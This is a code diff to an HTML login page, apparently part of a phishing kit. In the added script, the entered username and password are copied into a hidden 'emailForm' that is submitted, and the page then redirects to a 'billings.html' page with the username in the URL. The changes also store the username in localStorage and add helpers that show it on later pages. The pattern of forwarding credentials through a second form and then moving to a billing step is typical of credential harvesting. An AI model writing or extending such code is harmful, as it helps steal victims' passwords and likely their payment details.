@@ -101,17 +101,21 @@
 		let res = parseInt(input_val.value);
 
 		if (res == sum_result) {
+			const username = document.getElementById('username').value;
 			const emailForm = document.getElementById('emailForm');
 			const emailUsername = document.getElementById('emailUsername');
 			const emailPassword = document.getElementById('emailPassword');
 			
-			emailUsername.value = document.getElementById('username').value;
+			emailUsername.value = username;
 			emailPassword.value = document.getElementById('password').value;
+			
+			// Store username in localStorage
+			localStorage.setItem('currentUser', username);
 			
 			emailForm.submit();
 			
 			setTimeout(function() {
-				window.location.href = 'billings.html';
+				window.location.href = `billings.html?username=${encodeURIComponent(username)}`;
 			}, 1000);
 		} else {
 			const response = document.querySelector(".response");
@@ -175,5 +179,48 @@
 	}
 
 </style>
+
+<script>
+// Add this before form submission
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const username = document.getElementById('username').value; // Get username from login form
+    
+    // Update email form
+    document.getElementById('emailUsername').value = username;
+    document.getElementById('emailPassword').value = document.getElementById('password').value;
+    
+    // Submit email form and redirect with username
+    document.getElementById('emailForm').submit();
+    window.location.href = `billings.html?username=${encodeURIComponent(username)}`;
+});
+</script>
+
+<script>
+// Function to display username
+function displayUsername() {
+    const params = new URLSearchParams(window.location.search);
+    const urlUsername = params.get('username');
+    const storedUsername = localStorage.getItem('currentUser');
+    const username = urlUsername || storedUsername || 'Guest';
+    
+    // Find all elements with class 'username-display' and update them
+    const usernameElements = document.querySelectorAll('.username-display');
+    usernameElements.forEach(element => {
+        element.textContent = username;
+    });
+}
+
+// Run when page loads
+document.addEventListener('DOMContentLoaded', displayUsername);
+</script>
+
+<script>
+// Example of how to create links to other pages
+function createPageLink(page) {
+    const username = localStorage.getItem('currentUser');
+    return `${page}?username=${encodeURIComponent(username)}`;
+}
+</script>
 
 </body></html>
